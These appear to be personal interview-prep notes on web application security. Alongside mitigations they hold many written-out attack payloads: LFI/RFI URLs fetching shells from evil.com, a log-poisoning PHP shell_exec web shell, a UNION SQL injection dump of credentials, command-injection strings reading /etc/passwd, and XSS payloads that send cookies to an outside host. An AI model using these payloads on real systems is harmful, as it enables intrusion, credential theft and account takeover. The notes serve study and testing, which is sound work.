# SSL Certificate & Web Application Security

## 1. What is an SSL Certificate?
SSL (Secure Sockets Layer) is a standard security technology that establishes **encrypted** connections between servers and clients (e.g., websites and browsers), ensuring secure data transmission.

- **With SSL**, sensitive information (credit card numbers, login credentials) can be securely transmitted, preventing MITM (Man-In-The-Middle) attacks.
- **Without SSL**, data is vulnerable to interception, exposing users to identity theft and fraud.

---

## 2. Purpose of HTTP-Only and Secure Flags
- **HTTP-Only Flag**: Added to cookies to prevent client-side scripts (e.g., `document.cookie`) from accessing cookie information.
- **Secure Cookies**: Transmitted only over encrypted HTTP connections, ensuring data security.

**Flags Summary**:
- **HTTP-Only**: Prevents access to cookies via client-side scripts.
- **Secure**: Transmits cookies only over HTTPS (encrypted connection).

---

## 3. What is HTTP Response Splitting?
- **CRLF (Carriage Return Line Feed)**: When untrusted user input is not sanitized, CRLF characters can split HTTP responses into two, potentially leading to vulnerabilities like XSS (Cross-Site Scripting) and web cache poisoning.

### Impact of Attacks:
1. **XSS (Cross-Site Scripting)**: Injecting malicious scripts to steal data or hijack sessions.
2. **Website Defacement**: Changing website content to display attacker’s message.
3. **Phishing**: Redirecting users to fake login pages to steal credentials.

### Prevention:
1. **Input Validation**: Remove CRLF characters from untrusted data.
2. **Output Encoding**: Encode user input properly before including in response headers.
3. **Update Servers/Frameworks**: Regularly update to fix known vulnerabilities.

---

## 4. What is Header Manipulation?
Header Manipulation (also known as HTTP Header Injection) involves inserting malicious data into HTTP headers, often used for redirecting traffic or injecting malicious content.

### Common Types of Header Manipulation:
1. **Host Header Injection**: Changing the "Host" header to serve content from a different domain.
2. **Referer Header Injection**: Manipulating the "Referer" header to bypass security measures.
3. **X-Forwarded-For Injection**: Spoofing the IP address.
4. **Cookie Manipulation**: Modifying cookies to gain unauthorized access.

### Prevention:
1. Validate and sanitize all HTTP headers to prevent manipulation.
2. Use proper input/output encoding and security configurations.

---

## 5. OWASP Top 10 Web Application Vulnerabilities

![OWASP Top 10](media/859f86086425ce54e18126171ccbc775.png)

### 1. Broken Access Control:
- Unauthorized users can access restricted data or functionality.
- Exploitation includes URL manipulation, elevating privileges, and Insecure Direct Object References (IDOR).

### 2. Cryptographic Failures:
- Occurs when sensitive data is transmitted insecurely or weak encryption is used.
- Examples include weak or outdated cryptographic protocols.

### 3. Injection:
- Untrusted user input is processed as part of commands (e.g., SQL injections) to gain unauthorized access to databases.

### 4. Insecure Design:
- Weaknesses in the application’s design or architecture.
- Includes bypassing authentication mechanisms or gaining unauthorized access to sensitive data.

### 5. Security Misconfiguration:
- Default configurations or improperly set permissions can expose systems to vulnerabilities.

### 6. Vulnerable and Outdated Components:
- Using outdated third-party libraries or frameworks that have known vulnerabilities.

### 7. Identification and Authentication Failures:
- Weak or ineffective authentication mechanisms like easy-to-guess passwords or lack of multi-factor authentication.

### 8. Software and Data Integrity Failures:
- Inadequate protection against integrity violations within code and infrastructure.

### 9. Security Logging and Monitoring Failures:
- Inadequate logging and monitoring make it difficult to detect and respond to security incidents.

### 10. Server-Side Request Forgery (SSRF):
- Exploiting the server to make unauthorized requests, potentially leading to accessing sensitive internal resources.

---

## 6. Insecure Deserialization
- **Serialization**: Converting an object into a byte format to store or transmit data.
- **Deserialization**: Reconstructing the object from the byte format.

Insecure deserialization occurs when untrusted data is deserialized, leading to potential exploits like remote code execution or privilege escalation.

### Prevention:
1. **Input Validation**: Validate and sanitize all data before deserialization.
2. **Use Secure Libraries**: Employ libraries with built-in deserialization security.
3. **Update Software Regularly**: Patch vulnerabilities associated with deserialization.

---

## 7. CWE/SANS Top 25 Dangerous Software Errors
- The **CWE/SANS Top 25** lists the most dangerous software vulnerabilities, including issues like **hashing without a salt**, **HTTP verb tampering**, and others that can lead to severe security breaches.

### Example of CWE/SANS Top 25: 
- **Use of a One-Way Hash Without a Salt**: Hash functions like MD5 or SHA can be easily cracked if no salt is added to the password before hashing.
  
---

## 8. HTTP Verb Tampering
Bypassing web authentication and authorization by manipulating HTTP methods such as **PUT**, **DELETE**, **TRACE**, and **CONNECT**.

### Risk Methods:
1. **PUT**: Allows file uploads (e.g., uploading malicious scripts).
2. **DELETE**: Allows file deletion (e.g., defacing the website).
3. **CONNECT**: May allow the server to act as a proxy.
4. **TRACE**: Enables attackers to perform Cross-Site Tracing (XST) attacks.

### Prevention:
- Disable **PUT**, **DELETE**, **TRACE**, and **CONNECT** methods if they are not needed for normal operations.

---


1.  **How many ways to exploit put method?**
1.  Introduction to HTTP PUT Method
    1.  Scanning HTTP PUT Method (Nikto)
    2.  Exploiting PUT Method Using Cadaver
    3.  Exploiting PUT Method Using Nmap
    4.  Exploiting PUT Method Using Poster
    5.  Exploiting PUT Method Using Metasploit
    6.  Exploiting PUT Method Using Burp-suite
    7.  Exploiting PUT Method Using Curl
1.  **What is the difference between LFI RFI and directory traversal?**

**Directory listing** is a feature that allows web servers to list the content of a directory when there is no index file present. Therefore if a request is made to a directory on which directory listing is enabled, and there no index file such as index. Php or index.asp, the web server sends a directory listing as a response. **Traversal List down the files or change directory to identify the files.**

Web servers can be configured to automatically list the contents of directories that do not have an index page present. This can aid an attacker by enabling them to quickly identify the resources at a given path, and proceed directly to analyzing and attacking those resources. It particularly increases the exposure of sensitive files within the directory that are not intended to be accessible to users, such as temporary files and crash dumps.

**Directory listing Remediation: -**

1.  Configure your web server to prevent directory listings for all paths beneath the web root;
    1.  Place into each directory a default file (such as index.htm) that the web server will display instead of returning a directory listing.
    2.  You should make sure the directory does not contain sensitive information or you may want to restrict directory listings from the web server configuration.
    3.  **Directory traversal** is a type of HTTP exploit that is used by attackers to gain unauthorized access to restricted **directories** and files. **Directory traversal**, also known as **path traversal**
        -   Improperly implemented access control list of directories in web server can lead to directory traversal/path traversal attack. In simple words, an attacker can retrieve unauthorized files and directories from the server.

Both LFI (Local File Inclusion) and RFI (Remote File Inclusion) are web application vulnerabilities related to including files within an application. However, they differ in where the included files come from:

1.  LFI is a vulnerability that allows an **attacker to include and execute local files** on a target system by exploiting a flaw in an application or system that processes untrusted input.
    1.  Directory traversal is a vulnerability that allows an attacker to access files or directories outside of the web root directory by manipulating input that specifies the file path.

**how can you bypass the LFI using RCE? explain the scenario?**

LFI (Local File Inclusion) and RCE (Remote Code Execution) are two different types of vulnerabilities that can occur in web applications. LFI allows an attacker to include and execute local files on the server, while RCE allows an attacker to execute arbitrary code on the server. Here's how an attacker can use RCE to bypass LFI:

**Identify LFI:** The attacker first identifies an LFI vulnerability in the web application, which allows them to include local files on the server.

**Upload a Web Shell:** The attacker then uploads a web shell to the server using the LFI vulnerability. A web shell is a script that can be executed on the server to gain remote access and control.

**Execute Arbitrary Code:** With the web shell in place, the attacker can execute arbitrary code on the server by submitting commands through the web shell. This allows them to bypass the LFI vulnerability and execute code remotely.

1.  **The main difference between LFI and Directory Traversal is as follows**

**LFI** : IT has ability to execute file. It may be shell code or other local file which exist in the system

**Directory Traversal**: It only traversal the files, so we can only read it. It can't execute files. This is type of Sensitive Information Disclosure

**LFI** is reading a local file, either in the current working directory or using traversal a file in another directory on the same server as the application itself.

**LFI: -**In Local file inclusion means we can include the files of the web application. Also an attacker can retrieve the data from server and execute the data from the server. This execution is extra functionality compared to directory traversal/path traversal. Path traversal is subset of LFI. Therefore, LFI can exploit the path traversal.

A function vulnerable to LFI may also be vulnerable to RFI. It depends. In this scenario, you are including a local file, such as

1.  Code execution on server Information disclosure (system password, username and other files)
    1.  Code execution on client side such as poisoning attack

**Exploitation methods:**

1.  Injecting directory traversal techniques into user inputs.
    1.  Manipulating parameters used for file paths.

Exploiting misconfigurations in file handling functions.

**Impact:** Accessing sensitive information (configuration files, user data), executing malicious code, taking control of the server.

**Example:** An attacker injects ../../etc/passwd into a search bar, revealing system user information.

**LFI Example**

1.  Improper validation of user input leads to *read access of server resource*.
    1.  Example: <http://www.example.com?file=../../etc/passwd>

**RFI** is including a file from an external source.

**RFI: -** remote file inclusion vulnerability exploits the dynamic file inclusion mechanism in the web application. RFI can also exploit the file inclusion but by allowing the attacker to insert/include the remote file to the web server and execute it.

[htt**p://vulnerablesite.com/read_page.php?file=hxxp://hax.com/reverse-shell.php**](http://vulnerablesite.com/read_page.php?file=hxxp://hax.com/reverse-shell.php)

**File inclusion**

1.  Improper validation of user input leads to *the loading of an external resource into the server and execution therein*.
    1.  Example: <http://www.example.com/vuln_page.php?file=http://www.hacker.com/backdoor>

LFI is reading a local file" vs. "RFI is including remote file to server"

**Includes remote files:** An attacker tricks the application into fetching and executing code from a malicious file hosted on a different server.

**Exploitation methods:**

1.  Injecting URLs of remote malicious files into user inputs.
    1.  Exploiting vulnerabilities in functions that fetch external data.

**Impact:** Downloading and executing malware, stealing data from the server, launching further attacks on other systems.

**Example:** An attacker injects a URL containing malicious code into a comment form, compromising the server upon submission.

| Feature                 | LFI                                     | RFI                                          |
|-------------------------|-----------------------------------------|----------------------------------------------|
| File location           | Local server                            | Remote server                                |
| Exploitation difficulty | Easier (often just directory traversal) | Harder (requires specific vulnerabilities)   |
| Impact                  | Server-specific                         | Can be wider due to potential malware spread |

**LFI possible parameters**

file,document,folder,root,path,pg,style,pdf,template,php_path,doc,content,static and if any url mentioned ../../ to check traversal vulnerability weather it is changing directories or not.

**RFI possible parameters**

dest,redirect,url,path.continue,windows,next,data,reference,,site,html,val,validate,domain,callback,return,page,feed,host,port,to,out,view,dir,show,navigation,open

Tool:

Kadimus - <https://github.com/P0cL4bs/Kadimus>

LFISuite - <https://github.com/D35m0nd142/LFISuite>

fimap - <https://github.com/kurobeats/fimap>

1.  **will blocking ../ will prevent directory traversal?**

The ans is No. this is depend on the platform. Here are the mitigations below.

1.  1\. Validate the user’s input. Accept only valid values (whitelist).
    1.  2\. Remove “..\\” and “../” from any input that’s used in a file context.
    2.  3\. Use indexes instead of actual portions of file names while using language files. (i.e. – value 5 from the user submission = Indian, rather than expecting the user to return “Indian”).
    3.  4\. Implement strict code access policies to restrict where files can be saved to.
    4.  5\. Ensure the user cannot supply any part of the path to the file read or written to.
    5.  6\. UNIX system administrators are advised to use chrooted jails and code access policies to restrict where the files can be obtained or saved.
    6.  7\. Configure the default installation of the server software as per the requirements. The servers should also be maintained and patched with the latest updates.

1\. Basic LFI 2. Null Byte Injection 3.Double encoding 4. UTF-8 encoding 5. double // 6. Directory Traversal vulnerability (Follow Below)

Basic LFI

<http://example.com/index.php?page=../../../etc/passwd>

Null byte

<http://example.com/index.php?page=../../../etc/passwd%00>

Double encoding

<http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd>

<http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00>

UTF-8 encoding

<http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd>

<http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00>

Filter bypass tricks

<http://example.com/index.php?page=....//....//etc/passwd>

<http://example.com/index.php?page=..///////..////..//////etc/passwd>

<http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd>

Basic RFI

<http://example.com/index.php?page=http://evil.com/shell.txt>

Null byte

<http://example.com/index.php?page=http://evil.com/shell.txt%00>

Double encoding

<http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt>

LFI / RFI using wrappers: Wrapper php://filter

<http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php>

<http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php>

<http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php>

<http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php>

**hxxp://vulnerablesite.com/read_page.php?file=../../../../etc/passwd**

This lets you see what users are on the system, so maybe you can try to connect via SSH as one of those users or find more information about them. There's a lot of different things you can do with it.

**Code execution on server:**

Maybe you can also include a script that you've written to the server, or perhaps you've poisoned the access.log with code that would be executed by a preprocessor engine (such as placing \<? echo shell_exec(\$_GET["c"]); ?\> within a legitimate request that gets logged), to get remote code execution as a different user depending on the context.

**Mitigation**

1.  Input validation and sanitization: Sanitize all user inputs to remove malicious characters and code.
    1.  Secure coding practices: Avoid using functions vulnerable to file inclusion attacks.
    2.  Keep software updated: Patch vulnerabilities in web servers, frameworks, and libraries.
    3.  Restrict file access: Limit the application's ability to access sensitive files.
    4.  Use a Web Application Firewall (WAF): Implement a WAF to detect and block malicious requests.

=================

**Tell me what is authentication attacks.**

Authentication attacks are a type of web applications attacks that targets the authentication mechanisms used by a system to verify the identity of users or devices. The goal of authentication attacks is to gain unauthorized access to a system or network by bypassing or compromising the authentication controls. Here are some common types of authentication attacks:

1.  Weak authentication mechanisms, like easy-to-guess passwords, default, weak, or well-known passwords, such as "Password1" or "admin/admin" or lack of multi-factor authentication.
    1.  MITM attack
    2.  brute force or other automated attacks.
    3.  Uses weak or ineffective credential recovery and forgot-password processes, such as "knowledge-based answers," which cannot be made safe.
    4.  SQL injection: This attack injects malicious code into database queries to steal user credentials.
    5.  Cross-site scripting (XSS): This attack injects malicious scripts into websites to steal user cookies or session tokens.
    6.  Password spraying: This attack targets a specific username with many different passwords.
    7.  Exposes session identifier in the URL.
    8.  Reuse session identifier after successful login.

**Zero-day attacks:**

Attackers exploit previously unknown vulnerabilities in authentication systems.

These attacks are particularly dangerous because there are no known patches or defences available.

========

**Name some Common Browser Extension Technologies (5) \|** Cookie Editor, Wappalyzer, XSStrike, Hackbar, Retire.js

**There is a weakness in the application i.e. blank password link is accepted can you frame a scenario and exploit this weakness?**

**Submit Blank Password:** The attacker attempts to log in to the application using a valid username or email address, but with a blank password. Since the application accepts blank passwords, the login attempt is successful, and the attacker gains access to the account.

**Account Takeover and further fine tuning attacks :** With access to the account, the attacker can now perform various actions depending on the level of access granted. For example, the attacker may be able to view sensitive information, modify account settings, or perform unauthorized actions on behalf of the account owner or reset the another users password.

1.  Insufficient Rate Limiting
    1.  Account take over vulnerability
    2.  password policy checks to rest the password, reuse the old password as a new
    3.  CSRF
    4.  IDOR
    5.  Weak Authentication Mechanism
    6.  Lack of Session Management Controls

**What are the test cases for a forgot password functionality in a web application:**

Username enumeration, CSRF, Brute-force attack, MITM Attack, Rate limit attack, Password reused and password complexity checks,

**login page attacks**

(injection, Brust-force, user enumeration, default pwds, ssl issues, security mis conf headers, click-jacking and auto completion is on, source code disclosure of any sensitive info, port scanning for other service or running, vulnerable third party libraries files. Credential stuffing, session hijacking(attackers steal or predict sesssion tokens to impersonate legitimate users) rate liming, open redirects.

1.  **Also there were other common questions, like sql injection, formula injection, xxe, Dom-based xss, self xss, cors, sop, deserialization.**

[SQL Injection](onenote:https://d.docs.live.net/55ae89de0fa78438/Documents/Technical_Notes/Bug%20Vikash.one#SQL%20Injection&section-id={2C87A181-0CB6-4763-8DA7-D9DFB95821CD}&page-id={939C2443-9FEF-405E-83EB-15BAC5EF912E}&end) ([Web view](https://onedrive.live.com/view.aspx?resid=55AE89DE0FA78438%216150&id=documents&wd=target%28Bug%20Vikash.one%7C2C87A181-0CB6-4763-8DA7-D9DFB95821CD%2FSQL%20Injection%7C939C2443-9FEF-405E-83EB-15BAC5EF912E%2F%29))

Injection flaws are web application vulnerability that allows an attacker to send the malicious code through the web application after queries will be execution by the backend database. Or This is process of inserting sql statements through the web application user interface into some query that is then executed by the server.

1.  Union Sql injection: making it possible to combine two queries into a single result or result set.
    1.  Error Based Sql injection : this technique forces the database to generate an error.
    2.  Blind Based Sql injection : Boolean based verify whether certain conditions are true or false, If the web application is vulnerable to the blind sql injection but the result of the injection are not visible to an attacker.
    3.  Time based use database commands (e.g. sleep) to delay answers in conditional queries

Single order sql injection and second order sql injection the main goal of sql injection is dump credentials and compromised database.

**Single order Sql injectio**n à goal dump credentials and login into the application doing further attacks or inject the reverse shell into the victim machine and gain the access to it.

**Second order Sql injection** à insert the new record into the database such as using comment to inject query in database using this to make queries to db.

SQL Injection can be used in a range of ways to cause serious problems. By levering SQL Injection, an attacker could bypass authentication, access, modify and delete data within a database. In some cases, SQL Injection can even be used to execute commands on the operating system, potentially allowing an attacker to escalate to more damaging attacks inside of a network that sits behind a firewall.

1.identify sql injection (get or post)

2.indentify the no of columns using order by

3.identify vulnerable columns using union select

4.enumeration

\--\>current_user()

\--\>database()

\--\>@@version

\--\>tablename

\--\>columns

\--\>dump credentials or file upload

\--\>login into application or ssh or database if port is open

\--\>if login into application enumerate application: such as file upload,rfi,command injection

5.Basic shell

6.Priviledge escalation

<http://192.168.216.136/cat.php?id=1'>

<http://192.168.216.136/cat.php?id=1> order by 1

<http://192.168.216.136/cat.php?id=1> order by 2

<http://192.168.216.136/cat.php?id=1> order by 3

<http://192.168.216.136/cat.php?id=1> order by 4

<http://192.168.216.136/cat.php?id=1> order by 5 (error)

<http://192.168.216.136/cat.php?id=-1> union select 1,2,3,4

<http://192.168.216.136/cat.php?id=-1> union select 1,@@version,3,4

<http://192.168.216.136/cat.php?id=-1> union select 1,database(),3,4

<http://192.168.216.136/cat.php?id=-1> union select 1,user(),3,4

<http://192.168.216.136/cat.php?id=-1> union select 1,table_name,3,4 from information_schema.tables

<http://192.168.216.136/cat.php?id=-1> union select 1,column_name,3,4 from information_schema.columns where table_name='users'

<http://192.168.216.136/cat.php?id=-1> union select 1,concat(id,0x3a,login,0x3a,password),3,4 from users

After below commands are scenario based blindly follow

1.  Fix the query
    1.  Find the total number of columns
    2.  Find the vulnerable columns
    3.  Execute any database steps to reflect back
    4.  Enumerate the tables, columns, and find out data.
1.  **What is second order SQL injection?**

Second-order SQL injection refers to a type of SQL injection attack that targets an application that does not directly execute the injected SQL command. Instead, the injected SQL code is stored in a database or a file and is later used by the application in another query.

For example, consider a web application that stores user comments in a database and then displays those comments on a webpage. An attacker could submit a comment that includes SQL code that is not directly executed by the application, but is stored in the database. Later, when the application retrieves the comments from the database to display on the webpage, it concatenates the stored SQL code with the rest of the query. This can result in the malicious SQL code being executed, allowing the attacker to perform actions such as accessing unauthorized data or modifying the database.

Identifying these vulnerabilities can be very hard, depending on the complexity and traceability of the application architecture and implementation.

**Common parameters:** login, signup, profile, change password, taking notes, logout, comments, registration page, contact page,

**What is parameterized query?**

parameterized query is a way of writing a database query in which the **values that need to be provided at runtime are not directly inserted into the query string**. Instead, placeholders or parameters are used, and the actual values are supplied when the query is executed.

**Stored Procedures (SPs),** on the other hand, are **precompiled SQL statements** (pre-defined sets of instructions) that are stored on the database server. and then called or executed when needed. They are written in a specific syntax (such as T-SQL for Microsoft SQL Server) and can include input parameters, output parameters, and return values.

The key difference between parameterized queries and SPs is that parameterized queries are dynamically generated at runtime, while SPs are precompiled and stored on the server. Parameterized queries are more flexible because they allow you to change the query structure and input values at runtime, but SPs can offer better performance because they are already compiled and optimized. Additionally, SPs can encapsulate complex logic and business rules, making them easier to maintain and modify over time.

**=====**

**Command Injection**

OS Command Injection also called as Shell Injection it is server side injection vulnerability. This a technique used via a web interface in order to execute OS commands on a web server.

if the web interface that is not properly sanitized the input is vulnerable to this exploit.

So an attacker can inject unexpected and dangerous commands, upload malicious programs or even obtain passwords directly from the operating system.

We can execute multiple commands on the server, if user input is not sanitized.

1.  Whitelist validation which means verifies the user input if it is allow then validate it otherwise block the user input.
    1.  Minimum and maximum length
    2.  Character set
    3.  Date bounds Match to a Regular Expression Pattern i.e. ( ) \< \> & \* ‘ \| = ? ; [ ] \^ \~ ! . ” % @ / \\ : + ,

Examples: \`, \|\|, \|, ; ,' ,'" ," ,"' ,& ,&&

;id;, ;id ,;netstat -a; ,;system('cat%20/etc/passwd') ,;id; ,& ping -i 30 127.0.0.1 & ,& ping -n 30 127.0.0.1 & ,%0a ping -i 30 127.0.0.1 %0a ,\`ping 127.0.0.1\` ,\| id ,& id ,; id ,%0a id %0a

**XSS or Cross Site Scripting is a web application vulnerability the user is processed with some untrusted data through the web application without validation and is reflected back to the browser without encoding or escaping, resulting in code execution at the browser engine.**

**XXS:** Find some common pages such as comment box \| forums \|signup \|login page \|search bar \| Re gistration \| feedback form \| contact us \| folder name etc.....

**Stored XSS:** Vulnerable content management systems, forums, or product reviews can be exploited to store the script.

**DOM XSS:** Exploits vulnerabilities in client-side code and data handling, such as using unsensitized user input in JavaScript variables or manipulating cookies/URLs.

**How to Hunt for XSS**

• Find a Input Parameter, Give any input There. If your input reflects or stored anywhere there may be XSS

• Try to execute any JavaScript code there, if you succeed to execute any JavaScript there then there is a XSS vulnerability.

• Exploitation of XSS

1.  "\>\<svg onload=alert()\>
    1.  " onmouseover=alert() "
    2.  "autocous/onfocus="alert()
    3.  '-alert()-'
    4.  \<a href="javascript%26colon;alert(1)"\>click
    5.  \<iframe/src \\/\\/onload = prompt(1)

sort out all the parameters in burp-suite and check one by one or browse it through the webserver and check it here reflecting or not.

White characters Identification XSS Vulnerability:

1\. Characters ' " \< \> / // ( ) \^ script img svg div alert prompt

2\. Event Handlers

Hello" onkeypress="prompt(1)

\<div onpointerover="alert(45)"\>MOVE HERE\</div\>

\<div onpointerdown="alert(45)"\>MOVE HERE\</div\>

\<div onpointerenter="alert(45)"\>MOVE HERE\</div\>

\<div onpointerleave="alert(45)"\>MOVE HERE\</div\>

\<div onpointermove="alert(45)"\>MOVE HERE\</div\>

\<div onpointerout="alert(45)"\>MOVE HERE\</div\>

\<div onpointerup="alert(45)"\>MOVE HERE\</div\>

3\. Bypass using UTF-8

4\. Bypass using Unicode

5\. Bypass using HTML encoding

6\. Bypass using Octal encoding

7\. Bypass using Unicode

8\. Common WAF Bypass

7\. URl Redirection (instead of alert(1) we use this url redirection) if it is redirecting bing.com yes it is vulnerable for url redirection.

payload: \<script\>docuement.location.href="http://bing.com"\</script\>

[http://www.woodlandwordwide.com/wnew.faces/tiles/page/search.jsp?searchkey=\<script\>docuement.location.href="http://bing.com"\</script\>](http://www.woodlandwordwide.com/wnew.faces/tiles/page/search.jsp?searchkey=%3cscript%3edocuement.location.href=%22http://bing.com%22%3c/script%3e)

it will redirect to bing.com

8.Phishing instead of alert(1) we use the below script

\<iframe src="http://bing.com" height="100%" width="100%"\>\</iframe\>

9\. cookie stealing xss (victim website is transferring cookie to attacker website)

\<script\>doument.location.href="http://bing.com/p/?page="+document.cookie\</script\>

**10.XSS Through File Uploading**

two ways to do these attack

1.First method is the filename parameter it is reflecting in view-source such as abc.jpeg. so attack on filename only. send to intruder select the common payload and do the attack.

2.Second method is upload file and file uploaded context is xss script. upload the file and access the file so it will execute the payload to give the popup.

1.Simple file 2.contant type 3.extension type upload

upload the c99 file click there to executive or view source to find out the url. if it is windows system you can upload nc or c99 for reverse connection.

required cpp file others oscp

2.Contant type ( Burp suite content type Extension Verification )

First method: is use the double extension to upload a file if it is successfully uploaded. If there is no execution permission. Then use the second method.

Second method: file name is dhanush.php

capture the req from burp-suite to change the below format.

content-type: text/php(because it is text only it will not execute) so we can change to content-type: image/jpeg and forward. it will successfully upload and execution.

3.Extension verification:

double extensions

<https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/file-upload/malicious-images>

File Upload tool: <https://github.com/almandin/fuxploider>

best tool for identifying the valid extension --\> first do the starting detection of valid extension.

second thing uploading files. not required to do because first to upload valid extension.

reference watch the video.

Hackerone bounty Vulnerabilities details:

<https://hackerone.com/reports/390>

check there only while uploaded the file.

source code analysis

eLearning Security:

In Order to an application is vulnerable for file upload functionality. the following conditionals must be true

1.The File type is not checked against the whitelist for allowed formats

2.The file name and path of the uploaded file, he is known to the attacker guessable. The folder which the file is placed allow the execution for server side scripts

tip: Check the any image is available in application. check the source code to see where the file is stored

let's double check copy the file to url to access the image.

if the file upload successful use infect element to see the file where it is stored

11.Xss through RFI Vulnerability.

if the application has rfi vulnerability try to prepare the xxs script in attacker side such as

<http://10.10.11.24/xss.html> ==\> xss.html contain is xss script

try to execute the rfi vulnerability victim will get the popup massage example

<http://abc.com/cmn/js/ajax.php?url=http://10.10.11.24/xss.html>

12.self xss to reflected

Execution flow for self xss payload:

In Brupsuite response copy the vulnerable html response code into one file and open with the Firefox browser. it will give the popup message.

instead of alert one set the payload like this docuement.location.href="http://bing.com" so it will redirect the message to attacker website.

for example:

/@213dewf it is reflecting is browser add the xss script like /@213dewf"\>\<script\>alert(1)\</script\> if it will give the popup means it is self xss.

POC: registration,feedback,host header,/about/xss,referer,search filed common where it is reflecting.

**What is Dom based XSS? \#**

1.  Dom-based XSS, also known as Document Object Model-based Cross-Site Scripting or "type-0 XSS," is a web security vulnerability.
    1.  It occurs when malicious code is injected into client-side JavaScript, manipulating the HTML structure and content of a web page.
    2.  This manipulation happens only within the browser, without affecting the server-side response, making it a client-side vulnerability.
    3.  Attackers exploit this vulnerability to execute their scripts within the victim's browser environment.

**Common parameters:** DOM XSS vulnerabilities are mainly attributed to situations where user-controllable sources pass data to sinks, such as eval() , document. write , or inner HTML. \| the most popular, from this perspective, are the document.url, document.location and document. Referrer objects.

**What is DOM parsing?**

The Document Object Model (DOM) is an official recommendation of the World Wide Web Consortium (W3C). It defines an interface that **enables programs to access** and update the style, structure, and contents of XML documents. XML parsers that support DOM implement this interface.

**What is DOM parser and SAX parser?**

2) DOM parser is faster than SAX. because it accesses whole XML document in memory.

3) SAX parser in Java is better suitable for large XML file than DOM Parser because it doesn't require much memory.

4) DOM parser works on Document Object Model while SAX is an event-based xml parser

**What is XML parsing?**

XML Parser. A parser is a piece of program that takes a physical representation of some data and converts it into an in-memory form for the program as a whole to use. ... An XML Parser is a parser that is designed to read XML and create a way for programs to use XML. There are different types, and each has its advantages.

**Reflected XSS:** The malicious script originates from the user's input and is reflected back by the server in the response.

**Stored XSS:** The malicious script is permanently stored on the server, either through a user input or an attacker directly injecting it.

**DOM XSS:** The malicious script doesn't come from the server; instead, it's created or injected directly into the client-side JavaScript environment (the Document Object Model, or DOM).

**Reflected XSS:** Vulnerable input fields like search bars or comment forms can be used to inject the script.

**Self XSS:-**

**----------------**

1.  Self xss is a type of xss that cannot be shared or cannot replicate on attack in another machine. i.e. if you share the vulnerable url or html code it won't reproduce in another machine. In other words, only you can reproduce in your machine only.
    1.  A self-XSS vulnerability **occurs** when a web application allows users to inject malicious code into their **own accounts or browser sessions,** rather than the server being tricked into reflecting or storing it. This makes it distinct from reflected and stored XSS attacks.
    2.  While the reporter identified this as an **HTML injection,** during our investigation we confirmed this was **actually an XSS vulnerability** but would have required a target to copy and paste a payload themselves. We made an **exception to reward this self-xss** with our minimum bounty given this occurred on accounts.shopify.com.

**Exploitation:** Self-XSS operates by tricking users into copying and pasting malicious content into their browsers' [web developer console](https://en.wikipedia.org/wiki/Web_development_tools).[[1]](https://en.wikipedia.org/wiki/Self-XSS#cite_note-tomsguide-1) Usually, **the attacker posts a message that says by copying and running certain code**, the user will be able to hack another user's account. In fact, the code allows the attacker to hijack the victim's account.

The self xss is basically social engineering where attacker convinces user to paste code into browser and execute it. example:-I may ask you to paste a malicious JavaScript code into your browser URL bar which will give you logs about surfing data and look for such random tit-bits from which you will understand the difference between self xss and reflected xss with those logs. You may complain after trying that no results are found, but too late to complain. What I'm actually doing is, hacking your machine, masquerading the procedure to look like your help.

while reflected xss is browser executable within single HTTP response onto victims browser. They are activated through clicking a malicious link. Refer details, simple diagrams and example from this nice article(I haven't read it entirely but looks good enough to satisfy the thirst for information):-

**Drag and drop XSS (Cross-Site Scripting) vulnerability** is a type of security vulnerability that occurs when a web application allows users to drag and drop content, such as files or images, onto certain areas of the webpage. This vulnerability can be exploited by an attacker to inject malicious code, typically JavaScript, into the application, which is then executed by the victim's browser. This can lead to the theft of sensitive information, session hijacking, or other malicious activities

\<img src=nonvalid.jpg onerror=alert(0)\>

**CSRF Logout/Login**

Another potential method for using CSRF to execute self-xss against another user is discussed by @brutelogic in his post here: <https://brutelogic.com.br/blog/leveraging-self-xss/>

Essentially, CSRF is used to log the current user out of their session and log them back into our compromised user account containing the self-xss. Our cred stealing xss vector would work perfectly for this, since it would steal the user’s browser-stored credentials for us.

**Pre-Compromised Accounts**

While I’ve never seen/heard of this being successfully implemented, it is possible to target a particular email address and create an account on the affected site for them. The targeted email address will typically receive a welcome email letting them know an account has been created for them on the affected application. As the attacker, we insert the self-xss payload into the user’s account when the account is created. Since the user won’t know the password, we’ve set for them, we could also perform the password reset for them, or simply wait for them to perform a password reset request themselves. Once they successfully login to the account, our xss payload will execute.

**Xss Jacking**

xss jacking is a xss attack by Dylan Ayrey that can steal sensitive information from the victim. xss Jacking requires click hijacking, paste hijacking and paste self-xss vulnerabilities to be present in the affected site, and even needs the help of some social engineering to function properly, so I’m not sure how likely this attack would really be.

While this particular attack vector requires a specific series of somewhat unlikely events to occur, you can see a POC for xss jacking here: <https://security.love/XSSJacking/index2.html>

**Pure Social Engineering**

I added this one in even though it doesn’t require the site to actually contain a self-xss vulnerability. This type of attack relies on people being dumb enough to open their web console and paste in unknown JavaScript into it. While this seems rather unlikely, it apparently is more common than you’d think. This type of attack isn’t really a vulnerability on the site per-say, but could be used in conjunction with a lax (or missing) CSP to execute external JavaScript, or to steal the user’s session cookies if they are missing the HttpOnly flag, etc.

**Conclusion**

Hopefully we’ve been able to highlight some of the ways an attacker could exploit a seemingly innocuous self-xss vulnerability on your site. The key takeaways are:

Even though you don’t \*think\* that a self-xss vulnerability on your site carries risk, it probably does, and you should fix it regardless.

Make sure your site isn’t vulnerable to CSRF

1.  <https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet>

You should implement a good Content Security Policy (CSP) to prevent external scripts from loading in your application

1.  <https://www.owasp.org/index.php/Content_Security_Policy>

==========================================

